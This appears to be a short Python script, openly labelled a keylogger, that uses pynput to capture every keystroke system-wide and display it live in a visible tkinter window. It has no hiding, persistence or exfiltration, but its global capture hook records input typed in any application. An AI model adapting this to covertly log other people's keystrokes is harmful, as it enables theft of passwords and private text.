import tkinter as tk
from pynput.keyboard import Listener
import threading

root = tk.Tk()
root.title("SpacyTerminal - Keylogger")
root.geometry("800x600")

text_area = tk.Text(root, height=30, width=100, bg="black", fg="green", font=("Courier", 12))
text_area.pack(padx=10, pady=10)

def on_press(key):
    try:
        text_area.insert(tk.END, f'{key.char}')
        text_area.yview(tk.END)
    except AttributeError:
        text_area.insert(tk.END, f'[{key}]')
        text_area.yview(tk.END)

def start_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

listener_thread = threading.Thread(target=start_listener)
listener_thread.daemon = True
listener_thread.start()

root.mainloop()
